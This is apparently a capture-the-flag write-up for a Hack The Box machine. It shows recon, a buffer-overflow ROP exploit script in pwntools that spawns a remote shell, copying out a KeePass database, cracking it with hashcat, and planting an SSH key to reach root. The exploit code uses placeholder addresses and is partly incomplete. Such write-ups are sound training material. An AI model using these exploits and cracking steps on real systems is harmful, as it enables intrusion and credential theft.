## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

## Recon

### Nmap Scan
Identified open ports:
- **TCP 80** [HTTP](HTTP.md)
- **TCP 1337** (discovered via source code comment)

Performed additional scans:
```bash
nmap -sC -sV -p- 10.10.10.147
```

### Nikto Scan
Revealed default Apache page and /manual directory. A comment in the source code hinted at port 1337 and a downloadable binary (`myapp`).

## Binary Analysis (Buffer Overflow)

### Initial Test
Ran `myapp`, asked user input. Created a basic overflow with Python:
```python
print("A" * 200)
```
Submitted 200 A's and caused a crash.

### Using GDB (with peda)
- Ran `checksec`:
  - NX enabled
  - RELRO Partial
- Set follow mode: `set follow-fork-mode parent`
- Ran program with cyclic pattern from pwntools:
```python
from pwn import *
cyclic(200, n=8)
```

Used `x/xg $rsp` to get the address and determine the offset with:
```bash
pattern offset -q <value from RSP>
```
Offset identified: **120**

### Using Radare2
```bash
r2 -d myapp
[0x00000000]> aaa
[0x00000000]> afl
```
Revealed functions:
- `main` uses `/usr/bin/uptime` with a `system()` call
- `test` function contains a usable `pop r13; ret` gadget

### Using ROPgadget
Found:
- `pop r13; pop r14; pop r15; ret`

## ROP Chain Construction
- Place `/bin/sh` into memory
- Set r13 to `system@plt`
- Use gadget to pop r13, r14, r15 with dummy values
- Jump to `test()`

## Exploit Script
Local exploit with pwntools:
```python
from pwn import *
context.binary = './myapp'
p = process('./myapp')

offset = 120
pop_r13_r14_r15 = p64(0xdeadbeef)
system = p64(0xdeadbeef)
binsh = b"/bin/sh\x00"

payload = b"A" * offset
payload += pop_r13_r14_r15
payload += system
payload += p64(0x0) * 2
payload += p64(address_of_test)

p.sendlineafter("echo back?", payload)
p.interactive()
```

## Remote Exploitation
Modified above to use remote connection:
```python
p = remote('10.10.10.147', 1337)
```
Gained shell and accessed:
```bash
cat /home/user/user.txt
```

## Root Flag (KeePass)
### KeePass DB Found
- File: `MyPasswords.kdbx`
- Images: `IMG_0547.JPG`, etc.

### Exfiltration
- Base64 encoded files and copied to local machine
```bash
base64 MyPasswords.kdbx > kdbx.b64
```
- Decoded on attacker box
```bash
base64 -d kdbx.b64 > MyPasswords.kdbx
```

### SSH Key Auth Setup
- Generated RSA key pair
- Copied public key to `~/.ssh/authorized_keys`

### File Transfer
```bash
scp -i id_rsa user@10.10.10.147:IMG_0547.JPG .
```

### KeePass2John
Generated hash:
```bash
keepass2john MyPasswords.kdbx IMG_0547.JPG > hash.txt
```

### Cracking
```bash
hashcat -a 0 -m 13400 hash.txt rockyou.txt
```
Found password: `somepass123`

### Unlock DB
Used KeePassXC:
- Password: `somepass123`
- Key file: `IMG_0547.JPG`
- Retrieved: **Root password**

### Root Access
```bash
ssh -i id_rsa user@10.10.10.147
su root
```
Used KeePass creds for `root`, accessed:
```bash
cat /root/root.txt
```

## Flags
- **User:** `xxxx...`
- **Root:** `xxxx...`

## Resources
- [ROP Emporium](https://ropemporium.com/)
- [Pwntools Docs](http://docs.pwntools.com/en/stable/)
- [Keepass2John Guide](https://rubydevices.com.au/blog/how-to-hack-keepass)